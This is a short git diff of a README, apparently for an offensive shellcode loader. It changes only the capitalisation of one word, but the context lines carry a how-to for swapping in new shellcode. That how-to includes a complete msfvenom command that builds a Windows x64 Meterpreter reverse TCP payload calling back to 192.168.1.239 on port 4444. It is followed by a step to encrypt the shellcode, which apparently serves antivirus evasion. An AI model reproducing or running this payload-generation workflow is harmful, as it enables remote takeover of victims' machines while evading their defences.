@@ -14,7 +14,7 @@ make
 
 ## Using different shellcode
 
-- ##### generate your shellcode either with msfvenom or something else
+- ##### Generate your shellcode either with msfvenom or something else
     `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.239 LPORT=4444 -f raw -o meter.bin`
 
 - ##### Encrypt the shellcode
